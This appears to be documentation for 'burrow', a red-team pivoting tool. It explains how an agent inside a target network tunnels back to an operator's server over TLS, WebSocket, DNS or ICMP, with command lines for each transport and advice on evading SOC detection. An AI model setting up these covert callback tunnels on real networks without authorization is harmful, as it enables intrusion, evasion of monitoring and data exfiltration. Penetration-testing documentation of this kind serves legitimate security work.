# Transports

Transports are the delivery mechanism — how the agent's traffic gets out of the target network and reaches your server. Every pivoting method (SOCKS5, TUN, TAP, port forwards) rides on top of whatever transport is active.

Think of it this way: the transport is the road, the pivoting method is the vehicle.

## Transport Comparison

```
                    THROUGHPUT vs. STEALTH

  High ┤
       │   ● Raw TCP/TLS
  T    │        Best throughput, standard TLS traffic
  h    │
  r    │          ● WebSocket
  o    │              HTTPS-like, passes most proxies
  u    │
  g    │
  h    │                    ● HTTP
  p    │                        Higher overhead, but blends with web traffic
  u    │
  t    │
       │                              ● DNS
       │                                  Very slow, but almost never blocked
       │
       │                                        ● ICMP
  Low  ┤                                            Slowest, last resort
       └──────────────────────────────────────────────────────────►
                              STEALTH / EVASION
```

## Raw TCP/TLS (default)

**Protocol:** Direct TCP connection, wrapped in TLS
**Port:** Any (default 11601)
**Root required:** No (unless port < 1024)
**Throughput:** Full line speed

**When to use:** Always try this first. It's the fastest, most reliable transport.

**How it works:** The agent opens a TCP connection to your server. TLS encrypts everything. From a network perspective, it looks like any other TLS connection to an unknown service.

**Detection profile:** A persistent TLS connection to an unusual port. SOC teams monitoring for beaconing or unknown destinations may flag this. If you're worried about detection, use port 443 and consider WebSocket instead.

```bash
# Server
burrow server --listen 0.0.0.0:443

# Agent
burrow agent --connect YOUR_IP:443 --fp FINGERPRINT
```

**When it won't work:**
- Outbound TCP is blocked by firewall
- Egress filtered to only allow HTTP/HTTPS
- Deep packet inspection blocks non-HTTP TLS on port 443

---

## WebSocket

**Protocol:** HTTP/S upgrade to WebSocket (RFC 6455)
**Port:** 80 (ws) or 443 (wss)
**Root required:** No
**Throughput:** Near line speed (minimal HTTP framing overhead)

**When to use:** When raw TCP is blocked but HTTP/HTTPS is allowed. WebSocket starts as an HTTP request, then upgrades to a persistent bidirectional connection. Most firewalls and proxies pass it through without issue.

**How it works:**
```
Agent → HTTP GET /ws (Upgrade: websocket) → Server
        ↓
      101 Switching Protocols
        ↓
      Bidirectional binary stream (just like raw TCP)
```

**Detection profile:** Initial HTTP upgrade request, then persistent WebSocket connection. Looks like a web application using WebSocket (common for real-time apps, chat, dashboards). Blends better than raw TCP on port 443.

```bash
# Server
burrow server --listen 0.0.0.0:443 --transport ws

# Agent  
burrow agent --connect YOUR_IP:443 --transport ws --fp FINGERPRINT
```

**When it won't work:**
- Proxy strips WebSocket upgrades
- Only HTTP POST/GET allowed (no persistent connections)
- SSL inspection replaces certificates (fingerprint mismatch)

---

## DNS Tunnel

**Protocol:** DNS queries (A/TXT records over UDP 53)
**Root required:** No
**Throughput:** Very low (~110 bytes upstream per query, ~400 bytes downstream per TXT response)

**When to use:** When the target network is extremely locked down and only DNS resolution is allowed outbound. DNS is almost never fully blocked because machines need it to function. This is your "it gets through anything" transport.

**How it works:**
```
Upstream (agent → server):
  Agent encodes data as Base32 subdomain labels
  DATA.DATA.DATA.yourdomain.com → DNS query → Your DNS server → Decode

Downstream (server → agent):
  Server encodes response as Base64 TXT records
  Agent polls every 50ms for new data
```

**Detection profile:** High volume of DNS queries to a single domain with long, random-looking subdomain labels. DNS tunnel detection is well-understood by SOC teams — tools like Zeek, Suricata, and passive DNS monitoring will flag this. However, many organizations don't actively monitor DNS query content.

**Setup requirements:**
1. You need a domain name you control
2. Configure NS records pointing to your server IP
3. Your server must listen on UDP 53

```bash
# Server
burrow server --listen 0.0.0.0:53 --transport dns --domain tunnel.yourdomain.com

# Agent
burrow agent --connect tunnel.yourdomain.com --transport dns --no-tls
```

**Performance reality:**
- Expect 1-5 KB/s effective throughput
- Everything works, just slowly — SOCKS5 browsing is usable, nmap scans take much longer
- TUN mode over DNS works but is painful for anything beyond light recon
- File transfers are possible but slow

**When it won't work:**
- Organization uses a DNS proxy that only resolves known domains
- DNS queries are intercepted and re-resolved (your domain returns different results)
- UDP 53 outbound is blocked (rare, but some high-security environments do this)

---

## ICMP Tunnel

**Protocol:** ICMP Echo Request/Reply (ping packets)
**Root required:** Yes (raw sockets for ICMP)
**Throughput:** Very low (~1400 bytes per packet)

**When to use:** Absolute last resort. When even DNS is monitored or blocked, but ping is allowed. Some networks allow ICMP for diagnostic purposes while blocking everything else.

**How it works:**
```
Agent → ICMP Echo Request (data in payload) → Server
Server → ICMP Echo Reply (response in payload) → Agent
```

Data is embedded in the ICMP payload field, which can carry up to ~1400 bytes per packet.

**Detection profile:** Persistent ICMP traffic with large payloads. Normal ping packets are 64 bytes; ICMP tunnel packets are much larger and continuous. Any decent IDS will flag this.

```bash
# Server (requires root)
sudo burrow server --listen 0.0.0.0 --transport icmp

# Agent (requires root)
sudo burrow agent --connect YOUR_IP --transport icmp
```

**When it won't work:**
- ICMP is blocked outbound (many corporate firewalls drop it)
- ICMP payload inspection strips non-standard payloads
- You don't have root on the agent

---

## Transport Selection Flowchart

```
Can the agent reach your server on a TCP port?
├── YES ─── Is the port filtered to HTTP/S only?
│           ├── YES → WebSocket (ws/wss)
│           └── NO  → Raw TCP/TLS (fastest, simplest)
│
└── NO ──── Can the agent resolve DNS names?
            ├── YES → DNS tunnel (slow but reliable)
            └── NO  ─── Can the agent send ICMP (ping)?
                        ├── YES → ICMP tunnel (last resort, needs root)
                        └── NO  → HTTP tunnel (if you can reach an HTTP
                                  port on the target from outside)
```

## Transport Comparison Table

| | Raw TLS | WebSocket | DNS | ICMP |
|---|---|---|---|---|
| **Setup complexity** | Simple | Simple | Needs domain + NS records | Simple |
| **Root on agent** | No | No | No | Yes |
| **Typical throughput** | 10+ MB/s | 10+ MB/s | 1-5 KB/s | 1-5 KB/s |
| **Latency** | Low (ms) | Low (ms) | Medium (50ms polls) | Medium |
| **Survives proxy** | Maybe | Usually | Yes | N/A |
| **Detection risk** | Medium | Low | Medium-High | High |
| **Works through NAT** | Yes | Yes | Yes | Sometimes |
| **Best for** | Default choice | Firewall bypass | Locked-down networks | Nothing else works |

## Mixing Transports and Pivot Methods

The transport and pivot method are independent choices. Any combination works:

```
Transport: DNS  +  Pivot: TUN    = Full IP access over DNS (slow but works)
Transport: Raw  +  Pivot: SOCKS5 = Fast proxy access (most common)
Transport: WS   +  Pivot: TAP    = L2 bridge over WebSocket (Responder through HTTPS)
Transport: ICMP +  Pivot: SOCKS5 = TCP proxy over ping (last resort)
```

Choose the transport based on what egress is available. Choose the pivot method based on what traffic you need to send. They're separate decisions.
